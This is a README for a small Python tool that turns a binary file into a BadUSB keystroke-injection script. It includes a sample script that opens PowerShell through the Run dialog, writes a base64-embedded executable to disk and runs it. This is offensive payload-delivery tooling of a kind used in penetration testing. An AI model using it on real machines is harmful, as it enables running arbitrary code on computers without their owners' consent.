# BadUSBBinFilePS
Small program for generating BadUSB script that generates binary files in Python

![Screenshot](https://github.com/James-P-D/BadUSBBinFilePS/blob/main/screenshot.gif)

## Introduction

When using BadUSB it is sometimes necessary to get a binary file onto the target machine. Unless the ducky device you are using can double up as an HID input *and* an external drive, you typically need to download the binary file from some online source, usually over HTTP(S). As a workaround for this, I decided to create a short Python script which could generate a BadUSB script which included the base64-encoded data for the binary file and was decoded in Powershell.

## Usage

Running the script with arguments produces:

```
Python main.py BINARY_FILE OUTPUT_BAD_USB_FILE
E.G.
Python main.py helloworld.exe bad_usb_test.txt
```

So to run it simply supply the arguments for the binary file to encode, and name of the BadUSB script file to be created.

The outputted file will look something like this:

```
GUI r
DELAY 500
STRING powershell
ENTER
STRING $b64str = 'TVqQAAMAAAAEAAAA.....[Lots more data]'
ENTER
STRING $bytes = [Convert]::FromBase64String($b64str)
ENTER
DELAY 500
STRING [io.file]::WriteAllBytes('helloworld.exe', $bytes)
ENTER
DELAY 500
STRING ./helloworld.exe
ENTER
```

When run on the target Windows machine it will <kbd>WIN</kbd>+<kbd>r</kbd> to open the 'run' dialog, then start `powershell`, then decode the base64-encoded data and save to file, and then finally run the executable. The execution of this script can be seen in the video at the top of this file.